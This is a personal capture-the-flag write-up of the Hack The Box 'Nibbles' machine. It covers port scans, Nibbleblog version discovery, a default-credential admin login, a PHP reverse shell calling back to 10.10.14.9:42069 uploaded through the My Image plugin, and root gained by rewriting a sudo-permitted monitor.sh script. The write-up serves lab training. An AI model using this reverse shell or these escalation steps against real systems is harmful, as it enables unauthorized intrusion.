- ping machine
	- alive
```bash
┌──(kali㉿kali)-[~/htb/nibbles]
└─$ ping 10.10.10.75                                      
PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data.
64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=57.1 ms
64 bytes from 10.10.10.75: icmp_seq=2 ttl=63 time=53.1 ms
^C
--- 10.10.10.75 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 53.058/55.100/57.142/2.042 ms
```
- nmap for open ports
	- 22 
	- 80
```bash
┌──(kali㉿kali)-[~/htb/nibbles]
└─$ nmap -p- -T4 --open -vvv -Pn 10.10.10.75 -oN nibblesOpenPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 11:43 EST
Initiating Parallel DNS resolution of 1 host. at 11:43
Completed Parallel DNS resolution of 1 host. at 11:43, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:43
Scanning 10.10.10.75 [65535 ports]
Discovered open port 80/tcp on 10.10.10.75
Discovered open port 22/tcp on 10.10.10.75
Completed SYN Stealth Scan at 11:44, 17.70s elapsed (65535 total ports)
Nmap scan report for 10.10.10.75
Host is up, received user-set (0.054s latency).
Scanned at 2024-11-23 11:43:56 EST for 18s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds
           Raw packets sent: 65571 (2.885MB) | Rcvd: 65541 (2.622MB)
```
- nmap for services and versions running on open ports
- 22 ssh OpenSSH 7.2p2
- 80 Apache httpd/2.4.18
```bash
┌──(kali㉿kali)-[~/htb/nibbles]
└─$ nmap -p 22,80 -sC -sV -vvv 10.10.10.75 -oN nibbleServicesVersions
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 11:48 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
Initiating Ping Scan at 11:48
Scanning 10.10.10.75 [4 ports]
Completed Ping Scan at 11:48, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:48
Completed Parallel DNS resolution of 1 host. at 11:48, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:48
Scanning 10.10.10.75 [2 ports]
Discovered open port 80/tcp on 10.10.10.75
Discovered open port 22/tcp on 10.10.10.75
Completed SYN Stealth Scan at 11:48, 0.08s elapsed (2 total ports)
Initiating Service scan at 11:48
Scanning 2 services on 10.10.10.75
Completed Service scan at 11:49, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.75.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 1.84s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.24s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
Nmap scan report for 10.10.10.75
Host is up, received echo-reply ttl 63 (0.058s latency).
Scanned at 2024-11-23 11:48:55 EST for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```
- Navigating to ip reveals nibbleblog as the CMS
![[Pasted image 20241123122432.png]]
- Adding nibbleblog to end of ip address reveals a blog
![[Pasted image 20241123122618.png]]
- Gobuster to enumerate the website using the nibbleblog endpoint reveals
	- content
	- themes
	- admin
	- plugins
	- languages
- We know that nibbleblog is the CMS but we cannot find the version #.
	- To discover the version# we can download nibbleblog source code from [sourceforge](https://sourceforge.net/projects/nibbleblog/)
	- unzip to nibbleblog dir 
	- grep it for version 4.0.5 to discover where that info is located
		- `grep -R 4\.0\.5`
		- last result from the grep 
		- `./admin/boot/rules/98-constants.bit:define('NIBBLEBLOG_VERSION','4.0.5');`
	- navigating to http://10.10.10.75/nibbleblog/admin/boot/rules/98-constants.bit
		- we discover the nibbleblog version being used
	![[Pasted image 20241123144314.png]]

- Search for exploits, RCEs, etc on service's versions running on those open ports
	- searching for nibbleblog 4.0.3 vulns we find NibbleBlog version 4.0.3 suffers from a authenticated shell upload vulnerability. https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html
	- so we have to come back to this after we have credentials
		- upload rev shell at http://10.10.10.75/nibbleblog/plugins/my_image/plugin.bit
		- access uploaded images at http://localhost/nibbleblog/content/private/plugins/my_image/image.php

- Revisiting the nibbleblog source code and files we see an admin.php
```bash
┌──(kali㉿kali)-[~/htb/nibbles/nibbleblog-v4.0.5]
└─$ ls           
admin      content        feed.php   install.php  LICENSE.txt  sitemap.php  update.php
admin.php  COPYRIGHT.txt  index.php  languages    plugins      themes
```
- Navigating to http://10.10.10.75/nibbleblog/admin.php we see the admin login panel
![[Pasted image 20241123154735.png]]
- The default password for Nibbleblog is admin:nibbles
- After logging into the admin panel 
- activate the My Image plugin
- Nibbleblog runs on php so we grab a php reverse shell
- from revshells https://www.revshells.com/
```bash
<?php
$sock=fsockopen("10.10.14.9",42069);exec("/bin/sh -i <&3 >&3 2>&3");
?>
```
- start nc listener 
	- `nc -lnvp 42069`
- upload with the my image plugin @ 
	- `http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`
- navigate to the image location
	- `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php`
	- nc should grab the shell
- `cd /home/nibbler`
- `cat user.txt`

- sudo -l reveals that /home/nibbler/personal/stuff

- `unzip personal.zip`
- `cd personal`
- `cd stuff`
- wipe contents from monitor.sh
- add #!/bin/bash to file
```bash
#!/bin/bash
bash
```
- run `sudo /home/nibbler/personal/stuff/monitor.sh`
- cd to #
- `cat root.txt`





